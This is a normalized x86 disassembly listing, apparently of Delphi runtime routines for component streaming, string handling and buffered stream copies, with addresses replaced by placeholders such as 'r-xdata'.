mov ecx 0x1
mov eax ebx
call sub_41c440
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404504
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c440
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c440
jmp r-xdata
jmp r-xdata
call sub_41bf18
sub_41dd98
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41de6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c41c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41dcdc
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404710
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de76
lea eax [ ebp - 0xc ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41de7c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c440
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40480c
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41c440
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41c440
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404504
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41c440
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405b84
jmp r-xdata
jmp r-xdata
call sub_41bf18
sub_41de90
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41decc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41dca0
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ded3
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41ded8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c0d8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41df8c
mov eax [ ebx ]
call sub_41d044
pop ebx
pop ebp
retn
sub_41df00
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c440
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e384
pop ebx
pop ecx
pop ebp
retn
sub_41df30
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41c0d8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c41c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41d044
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41e384
jmp r-xdata
mov eax [ ebx ]
call sub_41df8c
mov eax [ ebx ]
call sub_41c0d8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41e128
mov eax [ ebx ]
call sub_41d044
sub_41df8c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e11b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41de7c
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e122
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
jmp [ eax * 4 + jump_table_41dfc3 ]
push ebp
call sub_41ded8
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41e384
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41e384
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e384
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41e384
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41dca0
jmp r-xdata
push ebp
mov eax 0x1
call sub_41df00
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41de90
jmp r-xdata
push ebp
mov eax 0x1
call sub_41df00
pop ecx
jmp r-xdata
push ebp
call sub_41df30
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e384
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e384
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e384
jmp r-xdata
push ebp
mov eax 0x2
call sub_41df00
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41e384
jmp r-xdata
push ebp
mov eax 0x1
call sub_41df00
pop ecx
sub_41e128
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41e165
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41dca0
mov eax ebx
call sub_41df8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e16c
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41e170
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41e208
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41c0d8
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41dca0
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41dca0
jmp r-xdata
mov eax ebx
call sub_41e128
mov eax ebx
call sub_41d044
jmp r-xdata
mov eax ebx
call sub_41c0d8
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41e170
mov eax ebx
call sub_41d044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e20f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
sub_41e218
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41e2bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403f50
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_421240
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2c4
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
sub_41e2e8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41e310
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41c370
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_417b98
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403354
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41c370
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41e384
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41c440
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41c440
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41e3cc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e575
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41bfa4
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e550
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41c440
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41ae6c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41c440
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b860
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e52b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41dcdc
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41c440
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41ae6c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41c440
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4145d0
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
lea eax [ ebp - 0x1c ]
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d350
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e532
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_41e594
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e78e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f004
mov eax [ ebp - 0x4 ]
call sub_41c41c
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
jmp [ eax * 4 + jump_table_41e5d6 ]
mov eax [ ebp - 0x4 ]
call sub_41de7c
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf8c
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_413194
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf8c
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_413194
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cf8c
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_413194
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cd70
mov eax ebx
call sub_41338c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cdb4
mov eax ebx
call sub_41338c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cdf8
mov eax ebx
call sub_4133b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ce48
mov eax ebx
call sub_4133a0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41dcdc
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4133c8
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41dd98
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4133f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41de7c
cmp al 0x9
sete dl
mov eax ebx
call sub_413364
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41e3cc
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f32c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cff8
push edx
push eax
mov eax ebx
call sub_413290
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e795
lea eax [ ebp - 0x1c ]
call sub_40f018
lea eax [ ebp - 0xc ]
call sub_4045c4
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov eax ebx
call sub_4146b8
jmp r-xdata
sub_41e79c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_41e968
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b8a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_41e7d4
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_4208a0
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41e7fc
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_4208a0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41e8e0
sub_41e840
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41ade8
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41e968
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41ae08
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41e894
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41e968
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41e8e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e957
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_420aec
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e894
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41e894
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e95e
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_41e994
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e9d7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040a0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4209e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9de
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41e9e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41ea76
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_420aec
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f278
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea7d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_419538
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41f270
mov edx esi
mov eax edi
call sub_419540
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f2c4
mov eax [ ebp - 0x4 ]
call sub_41f278
inc esi
dec ebx
jne r-xdata
sub_41ea84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_418700
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407e74
test al al
jne r-xdata
sub_41ead4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41ec1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_42135c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41ea84
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421330
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_42135c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421330
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec22
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421330
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_421330
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41ec28
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f004
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403078
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_404178
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e828
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e968
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41f280
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403078
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_40411c
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_420904
mov eax [ ebp - 0x8 ]
call sub_403070
call sub_403368
call sub_414948
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_40411c
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403078
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_40411c
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_404238
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_420904
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f2c4
mov eax [ ebp - 0x4 ]
call sub_41f278
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41efa5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420904
mov eax [ ebp - 0x4 ]
call sub_41e828
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418700
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41efac
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41ef63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41ead4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_403128
retn
